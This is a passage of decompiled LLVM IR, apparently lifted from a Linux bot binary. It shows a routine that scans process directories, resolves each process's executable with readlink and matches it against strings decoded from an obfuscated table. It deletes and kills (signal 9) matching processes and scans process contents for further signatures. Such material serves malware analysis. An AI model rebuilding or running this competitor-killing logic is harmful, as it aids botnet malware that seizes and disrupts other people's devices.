  store i32 %v2_d290, i32* @r1, align 4
  %v0_d294 = call i32 @util_zero()
  %v0_d298 = load i32, i32* @r7, align 4
  store i32 %v0_d298, i32* @r4, align 4
  %v0_d29c = load i32, i32* @r5, align 4
  store i32 400, i32* @r5, align 4
  %v2_d3a4 = ptrtoint i32* %stack_var_-160 to i32
  %v2_d3b0 = bitcast i32* %stack_var_-160 to i8*
  %v2_d3f4 = ptrtoint i32* %stack_var_-224 to i32
  %v2_d3f8 = bitcast i32* %stack_var_-224 to i8*
  %v2_d564 = ptrtoint i32* %stack_var_-44 to i32
  %v2_d574 = ptrtoint i32* %stack_var_-48 to i32
  %v2_d588 = ptrtoint i32* %stack_var_-52 to i32
  %v2_d59c = ptrtoint i32* %stack_var_-56 to i32
  %v2_d5ac = ptrtoint i32* %stack_var_-64 to i32
  %v2_d5b4 = ptrtoint i32* %stack_var_-60 to i32
  %v2_d5d8 = ptrtoint i32* %stack_var_-8416 to i32
  br label %dec_label_pc_d2a4

dec_label_pc_d2a4:                                ; preds = %dec_label_pc_d36c, %.thread9
  %stack_var_-8436.0 = phi i32 [ %v0_d29c, %.thread9 ], [ %stack_var_-8436.3, %dec_label_pc_d36c ]
  %v1_d2a8 = call i32 @table_unlock_val(i32 15)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d2b4 = call i32 @table_retrieve_val(i32 15, i32* null)
  %v1_d2b8 = call i32 @__GI_opendir(i32 %v3_d2b4)
  store i32 %v1_d2b8, i32* @r8, align 4
  %v2_d2bc = icmp eq i32 %v1_d2b8, 0
  br i1 %v2_d2bc, label %dec_label_pc_cf80, label %dec_label_pc_d2c4

dec_label_pc_d2c4:                                ; preds = %dec_label_pc_d2a4
  %v1_d2c8 = call i32 @table_lock_val(i32 15)
  %v0_d2cc139 = load i32, i32* @r8, align 4
  %v1_d2d0140 = inttoptr i32 %v0_d2cc139 to i32*
  %v2_d2d0141 = call i32 @__GI_readdir(i32* %v1_d2d0140)
  %v2_d2d4143 = icmp eq i32 %v2_d2d0141, 0
  br i1 %v2_d2d4143, label %dec_label_pc_d36c, label %dec_label_pc_d2dc.preheader

dec_label_pc_d2dc.preheader:                      ; preds = %dec_label_pc_d2c4, %dec_label_pc_d2cc.backedge
  %v0_d2dc155 = phi i32 [ %v2_d2d0, %dec_label_pc_d2cc.backedge ], [ %v2_d2d0141, %dec_label_pc_d2c4 ]
  %stack_var_-8436.1144 = phi i32 [ %stack_var_-8436.1.be, %dec_label_pc_d2cc.backedge ], [ %stack_var_-8436.0, %dec_label_pc_d2c4 ]
  br label %dec_label_pc_d2dc

dec_label_pc_d2dc:                                ; preds = %dec_label_pc_d2dc.preheader, %dec_label_pc_d354
  %v0_d2ec = phi i32 [ %v2_d360, %dec_label_pc_d354 ], [ %v0_d2dc155, %dec_label_pc_d2dc.preheader ]
  %stack_var_-8436.2 = phi i32 [ %v1_d300, %dec_label_pc_d354 ], [ %stack_var_-8436.1144, %dec_label_pc_d2dc.preheader ]
  %v1_d2dc = add i32 %v0_d2ec, 11
  %v2_d2dc = inttoptr i32 %v1_d2dc to i8*
  %v3_d2dc = load i8, i8* %v2_d2dc, align 1
  %v4_d2dc = zext i8 %v3_d2dc to i32
  %v1_d2e0 = add nsw i32 %v4_d2dc, -48
  store i32 %v1_d2e0, i32* %r3.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_d2e0, 9
  br i1 %tmp, label %dec_label_pc_d2cc.backedge, label %dec_label_pc_d2ec

dec_label_pc_d2ec:                                ; preds = %dec_label_pc_d2dc
  store i32 %v1_d2dc, i32* @r6, align 4
  store i32 %v1_d2dc, i32* @r0, align 4
  %v1_d2f4 = call i32 @atol(i32 %v1_d2dc)
  %v0_d2fc = load i32, i32* @r5, align 4
  %v1_d300 = add i32 %stack_var_-8436.2, 1
  store i32 %v1_d300, i32* %r1.global-to-local, align 4
  store i32 %v1_d2f4, i32* @r7, align 4
  %v5_d30c = icmp slt i32 %v0_d2fc, %v1_d2f4
  %v2_d37c = call i32 @__GI_time(i32* null)
  br i1 %v5_d30c, label %dec_label_pc_d378, label %dec_label_pc_d310

dec_label_pc_d310:                                ; preds = %dec_label_pc_d2ec
  %v0_d318 = load i32, i32* @r4, align 4
  %v2_d318 = sub i32 %v2_d37c, %v0_d318
  %v7_d320 = icmp slt i32 %v2_d318, 601
  br i1 %v7_d320, label %dec_label_pc_d328, label %.thread10

.thread10:                                        ; preds = %dec_label_pc_d310
  store i32 400, i32* @r5, align 4
  br label %dec_label_pc_d2cc.backedge

dec_label_pc_d328:                                ; preds = %dec_label_pc_d310
  %v0_d328 = load i32, i32* @r7, align 4
  %v7_d32c = icmp slt i32 %v0_d328, 401
  br i1 %v7_d32c, label %dec_label_pc_d2cc.backedge, label %dec_label_pc_d330

dec_label_pc_d330:                                ; preds = %dec_label_pc_d328
  %v3_d338 = zext i32 %v1_d300 to i64
  %v4_d338 = mul nuw i64 %v3_d338, 3435973837
  %v3_d33c1 = udiv i64 %v4_d338, 34359738368
  %v3_d3403 = mul nuw nsw i64 %v3_d33c1, 8
  %v3_d340 = trunc i64 %v3_d3403 to i32
  store i32 %v3_d340, i32* %r3.global-to-local, align 4
  %v2_d3445 = mul nuw nsw i64 %v3_d33c1, 2
  %v2_d344 = trunc i64 %v2_d3445 to i32
  %v2_d348 = add i32 %v3_d340, %v2_d344
  store i32 %v2_d348, i32* %r2.global-to-local, align 4
  %v9_d34c = icmp eq i32 %v1_d300, %v2_d348
  br i1 %v9_d34c, label %dec_label_pc_d354, label %dec_label_pc_d2cc.backedge

dec_label_pc_d354:                                ; preds = %dec_label_pc_d330
  %v1_d358 = call i32 @sleep(i32 1)
  %v0_d35c = load i32, i32* @r8, align 4
  %v1_d360 = inttoptr i32 %v0_d35c to i32*
  %v2_d360 = call i32 @__GI_readdir(i32* %v1_d360)
  %v2_d364 = icmp eq i32 %v2_d360, 0
  br i1 %v2_d364, label %dec_label_pc_d36c, label %dec_label_pc_d2dc

dec_label_pc_d36c:                                ; preds = %dec_label_pc_d2cc.backedge, %dec_label_pc_d354, %dec_label_pc_d2c4
  %stack_var_-8436.3 = phi i32 [ %stack_var_-8436.0, %dec_label_pc_d2c4 ], [ %v1_d300, %dec_label_pc_d354 ], [ %stack_var_-8436.1.be, %dec_label_pc_d2cc.backedge ]
  %v0_d36c = load i32, i32* @r8, align 4
  %v1_d370 = inttoptr i32 %v0_d36c to i32*
  %v2_d370 = call i32 @__GI_closedir(i32* %v1_d370)
  br label %dec_label_pc_d2a4

dec_label_pc_d378:                                ; preds = %dec_label_pc_d2ec
  %v1_d388 = call i32 @table_unlock_val(i32 15)
  %v1_d390 = call i32 @table_unlock_val(i32 16)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d39c = call i32 @table_retrieve_val(i32 15, i32* null)
  store i32 %v2_d3a4, i32* @fp, align 4
  store i32 %v3_d39c, i32* %r1.global-to-local, align 4
  store i32 %v2_d3a4, i32* @r0, align 4
  %v3_d3b0 = call i32 @util_strcpy(i8* %v2_d3b0, i32 %v3_d39c)
  %v1_d3b4 = load i32, i32* @fp, align 4
  %v2_d3b4 = add i32 %v1_d3b4, %v3_d3b0
  store i32 %v2_d3b4, i32* %r5.global-to-local, align 4
  %v0_d3b8 = load i32, i32* @r6, align 4
  store i32 %v0_d3b8, i32* %r1.global-to-local, align 4
  store i32 %v2_d3b4, i32* @r0, align 4
  %v2_d3c0 = inttoptr i32 %v2_d3b4 to i8*
  %v3_d3c0 = call i32 @util_strcpy(i8* %v2_d3c0, i32 %v0_d3b8)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d3d0 = call i32 @table_retrieve_val(i32 16, i32* null)
  store i32 %v3_d3d0, i32* %r1.global-to-local, align 4
  %v1_d3d8 = load i32, i32* %r5.global-to-local, align 4
  %v2_d3d8 = add i32 %v1_d3d8, %v3_d3c0
  store i32 %v2_d3d8, i32* @r0, align 4
  %v2_d3dc = inttoptr i32 %v2_d3d8 to i8*
  %v3_d3dc = call i32 @util_strcpy(i8* %v2_d3dc, i32 %v3_d3d0)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d3e8 = call i32 @table_retrieve_val(i32 15, i32* null)
  store i32 %v3_d3e8, i32* %r1.global-to-local, align 4
  store i32 %v2_d3f4, i32* @r0, align 4
  %v3_d3f8 = call i32 @util_strcpy(i8* %v2_d3f8, i32 %v3_d3e8)
  %v2_d404 = add i32 %v3_d3f8, %v2_d3f4
  store i32 %v2_d404, i32* @r5, align 4
  store i32 %v2_d404, i32* @r0, align 4
  %v0_d40c = load i32, i32* @r6, align 4
  store i32 %v0_d40c, i32* %r1.global-to-local, align 4
  %v2_d410 = inttoptr i32 %v2_d404 to i8*
  %v3_d410 = call i32 @util_strcpy(i8* %v2_d410, i32 %v0_d40c)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v3_d410, i32* @r4, align 4
  %v3_d420 = call i32 @table_retrieve_val(i32 34, i32* null)
  store i32 %v3_d420, i32* %r1.global-to-local, align 4
  %v0_d428 = load i32, i32* @r4, align 4
  %v1_d428 = load i32, i32* @r5, align 4
  %v2_d428 = add i32 %v1_d428, %v0_d428
  store i32 %v2_d428, i32* @r0, align 4
  %v2_d42c = inttoptr i32 %v2_d428 to i8*
  %v3_d42c = call i32 @util_strcpy(i8* %v2_d42c, i32 %v3_d420)
  %v1_d434 = call i32 @table_lock_val(i32 15)
  %v1_d43c = call i32 @table_lock_val(i32 16)
  store i32 %v1_d1dc, i32* %r1.global-to-local, align 4
  store i32 4095, i32* %r2.global-to-local, align 4
  %v3_d450 = call i32 @readlink(i32 %v2_d3a4, i32 %v1_d1dc, i32 4095)
  %v7_d454 = icmp eq i32 %v3_d450, -1
  store i32 %v3_d450, i32* @r5, align 4
  br i1 %v7_d454, label %dec_label_pc_d518, label %dec_label_pc_d460

dec_label_pc_d460:                                ; preds = %dec_label_pc_d378
  store i32 %v1_d1dc, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v4_d468 = add i32 %v3_d450, %v1_d1dc
  %v5_d468 = inttoptr i32 %v4_d468 to i8*
  store i8 0, i8* %v5_d468, align 1
  %v1_d470 = call i32 @table_unlock_val(i32 35)
  %v0_d474 = load i32, i32* @r4, align 4
  store i32 %v0_d474, i32* %r1.global-to-local, align 4
  %v2_d47c = inttoptr i32 %v0_d474 to i32*
  %v3_d47c = call i32 @table_retrieve_val(i32 35, i32* %v2_d47c)
  %v0_d480 = load i32, i32* @r5, align 4
  %v1_d480 = add i32 %v0_d480, -1
  store i32 %v1_d480, i32* @r1, align 4
  store i32 %v3_d47c, i32* %r2.global-to-local, align 4
  %v4_d48c = call i32 @util_stristr(i8* %v2_d1ec, i32 %v1_d480, i32 %v3_d47c)
  %v7_d490 = icmp eq i32 %v4_d48c, -1
  br i1 %v7_d490, label %dec_label_pc_d4ac, label %dec_label_pc_d498

dec_label_pc_d498:                                ; preds = %dec_label_pc_d460
  %v1_d49c = call i32 @unlink(i32 %v1_d1dc)
  %v0_d4a0 = load i32, i32* @r7, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  %v2_d4a8 = call i32 @kill(i32 %v0_d4a0, i32 9)
  br label %dec_label_pc_d4ac

dec_label_pc_d4ac:                                ; preds = %dec_label_pc_d460, %dec_label_pc_d498
  %v1_d4b0 = call i32 @table_lock_val(i32 35)
  %v1_d4b4 = call i32 @__getpid(i32 %v1_d4b0)
  store i32 %v1_d4b4, i32* @r0, align 4
  %v1_d4b8 = load i32, i32* @r7, align 4
  %v9_d4b8 = icmp eq i32 %v1_d4b4, %v1_d4b8
  br i1 %v9_d4b8, label %dec_label_pc_d4e4, label %dec_label_pc_d4c0

dec_label_pc_d4c0:                                ; preds = %dec_label_pc_d4ac
  %v0_d4c0 = call i32 @getppid()
  %v1_d4c4 = load i32, i32* @r7, align 4
  %v9_d4c4 = icmp eq i32 %v0_d4c0, %v1_d4c4
  br i1 %v9_d4c4, label %dec_label_pc_d4e4, label %dec_label_pc_d4cc

dec_label_pc_d4cc:                                ; preds = %dec_label_pc_d4c0
  store i32 ptrtoint (i32* @global_var_24f7c.79 to i32), i32* %r3.global-to-local, align 4
  %v2_d4d4 = load i32, i32* @global_var_24f7c.79, align 4
  store i32 %v2_d4d4, i32* %r1.global-to-local, align 4
  %v3_d4d8 = call i32 @util_strcmp(i8* %v2_d1ec, i32 %v2_d4d4)
  %v2_d4dc = icmp eq i32 %v3_d4d8, 0
  br i1 %v2_d4dc, label %dec_label_pc_d4f0, label %dec_label_pc_d4cc.dec_label_pc_d4e4_crit_edge

dec_label_pc_d4cc.dec_label_pc_d4e4_crit_edge:    ; preds = %dec_label_pc_d4cc
  %v0_d4e8.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_d4e4

dec_label_pc_d4e4:                                ; preds = %dec_label_pc_d4cc.dec_label_pc_d4e4_crit_edge, %dec_label_pc_d4c0, %dec_label_pc_d4ac
  %v0_d4e8 = phi i32 [ %v0_d4e8.pre, %dec_label_pc_d4cc.dec_label_pc_d4e4_crit_edge ], [ %v0_d4c0, %dec_label_pc_d4c0 ], [ %v1_d4b4, %dec_label_pc_d4ac ]
  store i32 %v2_d37c, i32* @r4, align 4
  store i32 %v0_d4e8, i32* @r5, align 4
  br label %dec_label_pc_d2cc.backedge

dec_label_pc_d2cc.backedge:                       ; preds = %dec_label_pc_d330, %dec_label_pc_d328, %dec_label_pc_d2dc, %dec_label_pc_d4e4, %dec_label_pc_d81c, %.thread10
  %stack_var_-8436.1.be = phi i32 [ %v1_d300, %dec_label_pc_d81c ], [ %v1_d300, %dec_label_pc_d4e4 ], [ %v1_d300, %.thread10 ], [ %stack_var_-8436.2, %dec_label_pc_d2dc ], [ %v1_d300, %dec_label_pc_d328 ], [ %v1_d300, %dec_label_pc_d330 ]
  %v0_d2cc = load i32, i32* @r8, align 4
  %v1_d2d0 = inttoptr i32 %v0_d2cc to i32*
  %v2_d2d0 = call i32 @__GI_readdir(i32* %v1_d2d0)
  %v2_d2d4 = icmp eq i32 %v2_d2d0, 0
  br i1 %v2_d2d4, label %dec_label_pc_d36c, label %dec_label_pc_d2dc.preheader

dec_label_pc_d4f0:                                ; preds = %dec_label_pc_d4cc
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_d4f8 = call i32 @__libc_open(i32 %v1_d1dc, i32 0)
  %v7_d4fc = icmp eq i32 %v2_d4f8, -1
  store i32 %v2_d4f8, i32* @r4, align 4
  br i1 %v7_d4fc, label %bb255, label %.thread12

bb255:                                            ; preds = %dec_label_pc_d4f0
  store i32 9, i32* @r1, align 4
  br label %.thread12

.thread12:                                        ; preds = %dec_label_pc_d4f0, %bb255
  store i32 ptrtoint (i32* @global_var_d510.82 to i32), i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v7_d4fc, i32 ptrtoint (i32* @global_var_114c0.81 to i32))
  %v0_d510 = load i32, i32* @r4, align 4
  %v1_d514 = call i32 @__GI___libc_close(i32 %v0_d510)
  br label %dec_label_pc_d518

dec_label_pc_d518:                                ; preds = %dec_label_pc_d378, %.thread12
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_d520 = call i32 @__libc_open(i32 %v2_d3a4, i32 0)
  %v7_d524 = icmp eq i32 %v2_d520, -1
  br i1 %v7_d524, label %dec_label_pc_d81c, label %dec_label_pc_d530

dec_label_pc_d530:                                ; preds = %dec_label_pc_d518
  %v1_d534 = call i32 @table_unlock_val(i32 20)
  %v1_d53c = call i32 @table_unlock_val(i32 21)
  %v1_d544 = call i32 @table_unlock_val(i32 22)
  %v1_d54c = call i32 @table_unlock_val(i32 23)
  %v1_d554 = call i32 @table_unlock_val(i32 24)
  %v1_d55c = call i32 @table_unlock_val(i32 36)
  store i32 %v2_d564, i32* %r1.global-to-local, align 4
  %v3_d56c = call i32 @table_retrieve_val(i32 20, i32* nonnull %stack_var_-44)
  store i32 %v2_d574, i32* %r1.global-to-local, align 4
  store i32 %v3_d56c, i32* @r6, align 4
  %v3_d580 = call i32 @table_retrieve_val(i32 21, i32* nonnull %stack_var_-48)
  store i32 %v2_d588, i32* %r1.global-to-local, align 4
  store i32 %v3_d580, i32* @sl, align 4
  %v3_d594 = call i32 @table_retrieve_val(i32 22, i32* nonnull %stack_var_-52)
  store i32 %v2_d59c, i32* %r1.global-to-local, align 4
  store i32 %v3_d594, i32* @sb, align 4
  %v3_d5a8 = call i32 @table_retrieve_val(i32 23, i32* nonnull %stack_var_-56)
  store i32 %v2_d5b4, i32* %r1.global-to-local, align 4
  %v3_d5bc = call i32 @table_retrieve_val(i32 24, i32* nonnull %stack_var_-60)
  store i32 %v2_d5ac, i32* %r1.global-to-local, align 4
  %v3_d5cc = call i32 @table_retrieve_val(i32 36, i32* nonnull %stack_var_-64)
  store i32 %v2_d5d8, i32* @r4, align 4
  store i32 %v2_d5d8, i32* @r1, align 4
  store i32 4096, i32* @r2, align 4
  %v1_d5e8136 = call i32 @__libc_read(i32 %v2_d520)
  %tmp256 = icmp slt i32 %v1_d5e8136, 1
  br i1 %tmp256, label %dec_label_pc_d84c, label %dec_label_pc_d5f4

dec_label_pc_d5f4:                                ; preds = %dec_label_pc_d530, %dec_label_pc_d5dc.backedge
  %v0_d698127 = phi i32 [ %v1_d5e8, %dec_label_pc_d5dc.backedge ], [ %v1_d5e8136, %dec_label_pc_d530 ]
  %v3_d5f8 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d5f8, i32* @r5, align 4
  %v5_d600 = icmp slt i32 %v0_d698127, %v3_d5f8
  br i1 %v5_d600, label %dec_label_pc_d610, label %dec_label_pc_d6d8.lr.ph

dec_label_pc_d6d8.lr.ph:                          ; preds = %dec_label_pc_d5f4
  %v1_d6d083 = add i32 %v0_d698127, -1
  store i32 %v1_d6d083, i32* %r1.global-to-local, align 4
  %v0_d6d8.pre = load i32, i32* @r6, align 4
  %v1_d6dc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d6d8

dec_label_pc_d610:                                ; preds = %dec_label_pc_d6d0.backedge, %dec_label_pc_d5f4
  store i32 %v2_cf90, i32* %r1.global-to-local, align 4
  %v3_d614 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_d614, i32* @r5, align 4
  %v5_d61c = icmp slt i32 %v0_d698127, %v3_d614
  br i1 %v5_d61c, label %dec_label_pc_d62c, label %.thread28

.thread28:                                        ; preds = %dec_label_pc_d610
  %v1_d70492 = add i32 %v0_d698127, -1
  store i32 %v1_d70492, i32* %r1.global-to-local, align 4
  %v2_d70493 = icmp eq i32 %v0_d698127, 0
  br i1 %v2_d70493, label %dec_label_pc_d62c, label %dec_label_pc_d70c.lr.ph

dec_label_pc_d70c.lr.ph:                          ; preds = %.thread28
  %v0_d70c.pre = load i32, i32* @sl, align 4
  %v1_d710.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d70c

dec_label_pc_d62c:                                ; preds = %dec_label_pc_d704.backedge, %.thread28, %dec_label_pc_d610
  store i32 %v2_cf90, i32* %r2.global-to-local, align 4
  %v3_d630 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_d630, i32* @r5, align 4
  %v5_d638 = icmp slt i32 %v0_d698127, %v3_d630
  br i1 %v5_d638, label %dec_label_pc_d648, label %.thread37

.thread37:                                        ; preds = %dec_label_pc_d62c
  %v1_d738101 = add i32 %v0_d698127, -1
  store i32 %v1_d738101, i32* %r1.global-to-local, align 4
  %v2_d738102 = icmp eq i32 %v0_d698127, 0
  br i1 %v2_d738102, label %dec_label_pc_d648, label %dec_label_pc_d740.lr.ph

dec_label_pc_d740.lr.ph:                          ; preds = %.thread37
  %v0_d740.pre = load i32, i32* @sb, align 4
  %v1_d744.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d740

dec_label_pc_d648:                                ; preds = %dec_label_pc_d738.backedge, %.thread37, %dec_label_pc_d62c
  store i32 %v2_cf90, i32* @r3, align 4
  %v3_d64c = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_d64c, i32* @r5, align 4
  %v5_d654 = icmp slt i32 %v0_d698127, %v3_d64c
  br i1 %v5_d654, label %dec_label_pc_d664, label %.thread46

.thread46:                                        ; preds = %dec_label_pc_d648
  %v1_d76c110 = add i32 %v0_d698127, -1
  store i32 %v1_d76c110, i32* %r1.global-to-local, align 4
  %v2_d76c111 = icmp eq i32 %v0_d698127, 0
  br i1 %v2_d76c111, label %dec_label_pc_d664, label %dec_label_pc_d774.lr.ph

dec_label_pc_d774.lr.ph:                          ; preds = %.thread46
  %v1_d77c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d774

dec_label_pc_d664:                                ; preds = %dec_label_pc_d76c.backedge, %.thread46, %dec_label_pc_d648
  %v3_d668 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_d668, i32* @r5, align 4
  %v5_d670 = icmp slt i32 %v0_d698127, %v3_d668
  br i1 %v5_d670, label %dec_label_pc_d680, label %.thread55

.thread55:                                        ; preds = %dec_label_pc_d664
  %v1_d7a4119 = add i32 %v0_d698127, -1
  store i32 %v1_d7a4119, i32* %r1.global-to-local, align 4
  %v2_d7a4120 = icmp eq i32 %v0_d698127, 0
  br i1 %v2_d7a4120, label %dec_label_pc_d680, label %dec_label_pc_d7ac.lr.ph

dec_label_pc_d7ac.lr.ph:                          ; preds = %.thread55
  %v1_d7b4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d7ac

dec_label_pc_d680:                                ; preds = %dec_label_pc_d7a4.backedge, %.thread55, %dec_label_pc_d664
  %v3_d684 = load i32, i32* %stack_var_-64, align 4
  store i32 %v3_d684, i32* @lr, align 4
  %v5_d68c = icmp slt i32 %v0_d698127, %v3_d684
  br i1 %v5_d68c, label %dec_label_pc_d5dc.backedge, label %.thread61

dec_label_pc_d5dc.backedge:                       ; preds = %dec_label_pc_d6b8, %.thread61, %dec_label_pc_d680
  store i32 %v2_d5d8, i32* @r1, align 4
  store i32 4096, i32* @r2, align 4
  %v1_d5e8 = call i32 @__libc_read(i32 %v2_d520)
  %tmp257 = icmp slt i32 %v1_d5e8, 1
  br i1 %tmp257, label %dec_label_pc_d84c, label %dec_label_pc_d5f4

.thread61:                                        ; preds = %dec_label_pc_d680
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_d698129 = icmp eq i32 %v0_d698127, 0
  br i1 %v2_d698129, label %dec_label_pc_d5dc.backedge, label %dec_label_pc_d6a0.lr.ph

dec_label_pc_d6a0.lr.ph:                          ; preds = %.thread61
  %v1_d6a8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_d6a0

dec_label_pc_d6a0:                                ; preds = %dec_label_pc_d6b8, %dec_label_pc_d6a0.lr.ph
  %v0_d698.in = phi i32 [ %v0_d698127, %dec_label_pc_d6a0.lr.ph ], [ %v0_d698, %dec_label_pc_d6b8 ]
  %v0_d6b8 = phi i32 [ 0, %dec_label_pc_d6a0.lr.ph ], [ %v1_d6b8, %dec_label_pc_d6b8 ]
  %v1_d6a4 = phi i32 [ 0, %dec_label_pc_d6a0.lr.ph ], [ %v1_d6a4202, %dec_label_pc_d6b8 ]
  %v0_d698 = add i32 %v0_d698.in, -1
  store i32 %v3_d5cc, i32* %r3.global-to-local, align 4
  %v2_d6a4 = add i32 %v1_d6a4, %v3_d5cc
  %v3_d6a4 = inttoptr i32 %v2_d6a4 to i8*
  %v4_d6a4 = load i8, i8* %v3_d6a4, align 1
  %v6_d6a4 = zext i8 %v4_d6a4 to i32
  store i32 %v6_d6a4, i32* %r2.global-to-local, align 4
  %v2_d6a8 = add i32 %v0_d6b8, %v1_d6a8.pre
  %v3_d6a8 = inttoptr i32 %v2_d6a8 to i8*
  %v4_d6a8 = load i8, i8* %v3_d6a8, align 1
  %v6_d6a8 = zext i8 %v4_d6a8 to i32
  store i32 %v6_d6a8, i32* @r3, align 4
  %v9_d6ac = icmp eq i8 %v4_d6a8, %v4_d6a4
  br i1 %v9_d6ac, label %dec_label_pc_d7cc, label %bb258

bb258:                                            ; preds = %dec_label_pc_d6a0
  br label %dec_label_pc_d6b8

dec_label_pc_d6b8:                                ; preds = %bb258, %dec_label_pc_d7cc
  %v1_d6a4202 = phi i32 [ %v1_d7cc, %dec_label_pc_d7cc ], [ 0, %bb258 ]
  %v1_d6b8 = add i32 %v0_d6b8, 1
  store i32 %v1_d6b8, i32* %r1.global-to-local, align 4
  %v2_d698 = icmp eq i32 %v0_d698, 0
  br i1 %v2_d698, label %dec_label_pc_d5dc.backedge, label %dec_label_pc_d6a0

dec_label_pc_d6c0:                                ; preds = %dec_label_pc_d6d8
  %v1_d6c0 = add i32 %v1_d6d8, 1
  store i32 %v1_d6c0, i32* @lr, align 4
  %v9_d6c4 = icmp eq i32 %v3_d5f8, %v1_d6c0
  br i1 %v9_d6c4, label %dec_label_pc_d7d8, label %dec_label_pc_d6d0.backedge

dec_label_pc_d6d0.backedge:                       ; preds = %dec_label_pc_d6c0, %dec_label_pc_d6ec
  %v1_d6d8160 = phi i32 [ 0, %dec_label_pc_d6ec ], [ %v1_d6c0, %dec_label_pc_d6c0 ]
  %storemerge148 = add i32 %storemerge148.in, 1
  %v1_d6d0 = add i32 %v0_d6d0, -1
  store i32 %v1_d6d0, i32* %r1.global-to-local, align 4
  %v2_d6d0 = icmp eq i32 %v0_d6d0, 0
  br i1 %v2_d6d0, label %dec_label_pc_d610, label %dec_label_pc_d6d8

dec_label_pc_d6d8:                                ; preds = %dec_label_pc_d6d0.backedge, %dec_label_pc_d6d8.lr.ph
  %v0_d6d0 = phi i32 [ %v1_d6d083, %dec_label_pc_d6d8.lr.ph ], [ %v1_d6d0, %dec_label_pc_d6d0.backedge ]
  %storemerge148.in = phi i32 [ 0, %dec_label_pc_d6d8.lr.ph ], [ %storemerge148, %dec_label_pc_d6d0.backedge ]
  %v1_d6d8 = phi i32 [ 0, %dec_label_pc_d6d8.lr.ph ], [ %v1_d6d8160, %dec_label_pc_d6d0.backedge ]
  %v2_d6d8 = add i32 %v1_d6d8, %v0_d6d8.pre
  %v3_d6d8 = inttoptr i32 %v2_d6d8 to i8*
  %v4_d6d8 = load i8, i8* %v3_d6d8, align 1
  %v6_d6d8 = zext i8 %v4_d6d8 to i32
  store i32 %v6_d6d8, i32* %r2.global-to-local, align 4
  %v2_d6dc = add i32 %storemerge148.in, %v1_d6dc.pre
  %v3_d6dc = inttoptr i32 %v2_d6dc to i8*
  %v4_d6dc = load i8, i8* %v3_d6dc, align 1
  %v6_d6dc = zext i8 %v4_d6dc to i32
  store i32 %v6_d6dc, i32* %r3.global-to-local, align 4
  %v9_d6e0 = icmp eq i8 %v4_d6dc, %v4_d6d8
  br i1 %v9_d6e0, label %dec_label_pc_d6c0, label %dec_label_pc_d6ec

dec_label_pc_d6ec:                                ; preds = %dec_label_pc_d6d8
  br label %dec_label_pc_d6d0.backedge

dec_label_pc_d6f4:                                ; preds = %dec_label_pc_d70c
  %v1_d6f4 = add i32 %v1_d70c, 1
  store i32 %v1_d6f4, i32* @lr, align 4
  %v9_d6f8 = icmp eq i32 %v3_d614, %v1_d6f4
  br i1 %v9_d6f8, label %dec_label_pc_d7d8, label %dec_label_pc_d704.backedge

dec_label_pc_d704.backedge:                       ; preds = %dec_label_pc_d6f4, %dec_label_pc_d720
  %v1_d70c169 = phi i32 [ 0, %dec_label_pc_d720 ], [ %v1_d6f4, %dec_label_pc_d6f4 ]
  %storemerge147 = add i32 %storemerge147.in, 1
  %v1_d704 = add i32 %v0_d704, -1
  store i32 %v1_d704, i32* %r1.global-to-local, align 4
  %v2_d704 = icmp eq i32 %v0_d704, 0
  br i1 %v2_d704, label %dec_label_pc_d62c, label %dec_label_pc_d70c

dec_label_pc_d70c:                                ; preds = %dec_label_pc_d704.backedge, %dec_label_pc_d70c.lr.ph
  %v0_d704 = phi i32 [ %v1_d70492, %dec_label_pc_d70c.lr.ph ], [ %v1_d704, %dec_label_pc_d704.backedge ]
  %storemerge147.in = phi i32 [ 0, %dec_label_pc_d70c.lr.ph ], [ %storemerge147, %dec_label_pc_d704.backedge ]
  %v1_d70c = phi i32 [ 0, %dec_label_pc_d70c.lr.ph ], [ %v1_d70c169, %dec_label_pc_d704.backedge ]
  %v2_d70c = add i32 %v1_d70c, %v0_d70c.pre
  %v3_d70c = inttoptr i32 %v2_d70c to i8*
  %v4_d70c = load i8, i8* %v3_d70c, align 1
  %v6_d70c = zext i8 %v4_d70c to i32
  store i32 %v6_d70c, i32* %r2.global-to-local, align 4
  %v2_d710 = add i32 %storemerge147.in, %v1_d710.pre
  %v3_d710 = inttoptr i32 %v2_d710 to i8*
  %v4_d710 = load i8, i8* %v3_d710, align 1
  %v6_d710 = zext i8 %v4_d710 to i32
  store i32 %v6_d710, i32* %r3.global-to-local, align 4
  %v9_d714 = icmp eq i8 %v4_d710, %v4_d70c
  br i1 %v9_d714, label %dec_label_pc_d6f4, label %dec_label_pc_d720

dec_label_pc_d720:                                ; preds = %dec_label_pc_d70c
  br label %dec_label_pc_d704.backedge

dec_label_pc_d728:                                ; preds = %dec_label_pc_d740
  %v1_d728 = add i32 %v1_d740, 1
  store i32 %v1_d728, i32* @lr, align 4
  %v9_d72c = icmp eq i32 %v3_d630, %v1_d728
  br i1 %v9_d72c, label %dec_label_pc_d7d8, label %dec_label_pc_d738.backedge

dec_label_pc_d738.backedge:                       ; preds = %dec_label_pc_d728, %dec_label_pc_d754
  %v1_d740178 = phi i32 [ 0, %dec_label_pc_d754 ], [ %v1_d728, %dec_label_pc_d728 ]
  %storemerge146 = add i32 %storemerge146.in, 1
  %v1_d738 = add i32 %v0_d738, -1
  store i32 %v1_d738, i32* %r1.global-to-local, align 4
  %v2_d738 = icmp eq i32 %v0_d738, 0
